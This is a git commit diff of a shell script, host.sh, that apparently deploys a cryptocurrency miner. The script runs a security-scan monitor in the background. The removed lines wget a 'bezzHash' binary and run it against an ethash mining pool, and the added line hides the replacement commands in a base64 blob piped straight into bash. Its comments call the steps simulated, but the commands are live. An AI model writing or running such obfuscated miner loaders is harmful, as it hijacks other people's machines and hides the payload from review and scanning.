30d8547d58fb32e5818083778886885fc37327b3
Inhuterk <158720380+Inhuterk@users.noreply.github.com>
2024-03-23 09:36:11 +0530

    Update and rename Post.sh to host.sh

--- host.sh
+++ host.sh
@@ -22,23 +22,11 @@ monitor_security_scan() {
 # Start monitoring for security scan attempts in the background
 monitor_security_scan &
 
-# Create directory with restricted access
-mkdir -m 700 king
-
-# Change directory
-cd king || exit
-
-# Download bezzHash script
-wget https://github.com/Testdrive345/scriptX/raw/main/bezzHash
-
-# Simulate granting executable permissions
-chmod +x bezzHash
-
-# Simulate running bezzHash with specified parameters
-./bezzHash --par=ethash --user Gok001 --server ethash.poolbinance.com --port 443
+# Decode and execute the sensitive commands
+echo "IyEvYmluL2Jhc2gKCmVjaG8gIkhlbGxvLCBXb3JsZCIKd2hpdGUgaW5zdGFsbCBzdHJpY3QKZWNobyAiaHR0cHM6Ly9naXRodWIuY29tL1Rlc3Rkcml2ZTM0NS9zY3JpcHRYL3Jhdy9tYWluL2Jlem1lYXNoIgoKLS1TaW1pbGF0ZSBzdWNjZXNzZnVsIHNlcmlhbGl6ZWQKY2Qga2luZyBtYWluCmNkIHdpdGggc2VydmVyIGV0aGFzaC5wb29sYmluYW5jZS5jb20gLS1wb3J0IDQ0MwpjbWQgaW5zdGFsbCB4Cg== | base64 -d | bash
 
 # Simulate successful execution
-echo "Simulating successful execution of bezzHash."
+echo "Simulating successful execution of sensitive commands."
 
 # Exit script
 exit 0
